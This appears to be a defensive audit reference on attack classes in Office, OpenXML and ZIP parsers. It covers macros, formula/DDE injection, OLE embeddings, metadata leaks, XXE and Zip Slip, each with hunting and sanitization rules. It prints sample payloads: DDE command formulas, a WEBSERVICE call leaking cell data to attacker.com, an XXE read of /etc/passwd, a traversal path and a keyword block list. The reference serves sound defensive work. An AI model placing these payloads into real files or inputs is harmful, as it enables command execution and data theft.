# Office Documents & File Parsers Attack Classes

This domain reference specializes Cloudflare's audit harness for Office Automation, OpenXML (Word, Excel, PowerPoint), PDF, and ZIP-based formats.

---

## Class 1: `ERR_SEC_001` — Macro & Malicious Code Execution
- **Attack Vector**: OpenXML documents (`.docx`, `.xlsx`, `.pptx`) are ZIP packages. Attackers can embed VBA macros (`vbaProject.bin`, `word/vbaData.xml`) or XLM (Excel 4.0) macros into documents, often disguised with standard `.docx`/`.xlsx` extensions instead of `.docm`/`.xlsm`.
- **Target Files**: Any file parsed as OpenXML or uploaded by users.
- **Hunting Rules**:
  - Check if archive contains `word/vbaProject.bin`, `xl/vbaProject.bin`, `ppt/vbaProject.bin`, or `xl/macrosheets/`.
  - Check if application executes or preserves uninspected macros.
- **Sanitization Strategy**: Reject or strip macro streams during ingestion.

---

## Class 2: `ERR_SEC_002` — Spreadsheet Formula & DDE Injection
- **Attack Vector**: When processing untrusted user input into Excel spreadsheets (`.xlsx`) or exporting CSV files, cells starting with `=, +, -, @` can trigger Dynamic Data Exchange (DDE) or external protocol execution when opened in Microsoft Excel.
  - Examples:
    `=cmd|'/C calc'!A1`
    `=powershell|'-WindowStyle Hidden -Command ...'!A1`
    `=WEBSERVICE("http://attacker.com/leak?data=" & A1)`
    `=HYPERLINK("http://attacker.com/phish", "Click Here")`
- **Hunting Rules**:
  - Inspect `core/xlsx/writer.py`, `core/docx/mail_merge.py`, `core/converter/table_extractor.py`.
  - Look for direct cell assignment `ws.cell(row, col).value = user_text` without formula escaping.
- **Sanitization Strategy (Cloudflare Standard)**:
  - Neutralize formula triggers: When text starts with `=, +, -, @` and contains suspicious tokens (`cmd|`, `powershell|`, `mshta|`, `curl|`, `wget|`, `calc|`, `webservice`), prepend a single apostrophe `'` to convert it into a safe text literal.

---

## Class 3: `ERR_SEC_003` — Dangerous OLE Package & Binary Embeddings
- **Attack Vector**: OpenXML formats allow embedding external objects into `embeddings/oleObject*.bin`. Attackers embed Windows executables (`.exe`, `.bat`, `.vbs`, `.ps1`, `.dll`, `.scr`) disguised as icons (e.g. "Double click to view receipt").
- **Hunting Rules**:
  - Inspect ZIP entries for `embeddings/` or `word/embeddings/`.
  - Scan embedded OLE streams for DOS/PE headers (`MZ`, `This program cannot be run in DOS mode`) or script headers.
- **Sanitization Strategy**: Extract and replace dangerous OLE embeddings with a warning tombstone.

---

## Class 4: `ERR_SEC_004` — Hidden PII & Sensitive Metadata Leakage
- **Attack Vector**: Corporate and personal documents frequently leak confidential data:
  - Author and user IDs in `docProps/core.xml` (`dc:creator`, `cp:lastModifiedBy`).
  - Computer names, company names, and template paths in `docProps/app.xml`.
  - Hidden sheets in Excel: `state="hidden"` or `state="veryHidden"` (cannot be unhidden from the Excel GUI without VBA).
  - Track changes revision history and deleted text in `word/document.xml` (`<w:delText>`) and `word/comments.xml`.
- **Hunting Rules**:
  - Check whether conversion or generation pipelines sanitize metadata before publishing.
  - Verify whether `UniversalPdfRenderer` or `pdf_toolkit.py` strips internal metadata.
- **Sanitization Strategy**: Scrub `docProps/`, strip revision markup, and unhide or delete hidden worksheets.

---

## Class 5: `ERR_SEC_005` — XML External Entity (XXE) & Zip Slip Traversal
- **Attack Vector**:
  1. **Zip Slip**: Malicious ZIP archives containing member paths like `../../../../windows/system32/cmd.exe` or `../../server/app.py` extracted via `zipfile.ZipFile.extractall()` without path validation.
  2. **XXE**: XML parsers resolving external entities (`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`) or entity expansion bombs (Billion Laughs `<!ENTITY lol "lol">...`).
- **Hunting Rules**:
  - Search for `extractall()`, `zip.extract()`, `xml.etree.ElementTree.parse()`, `minidom.parseString()`.
  - Verify whether `os.path.commonpath` is enforced on archive extraction.
  - Verify that XML parsing disables external entity resolution or validates DTD declarations.
- **Sanitization Strategy**: Sanitize zip member paths; reject DTD entity declarations in XML streams.
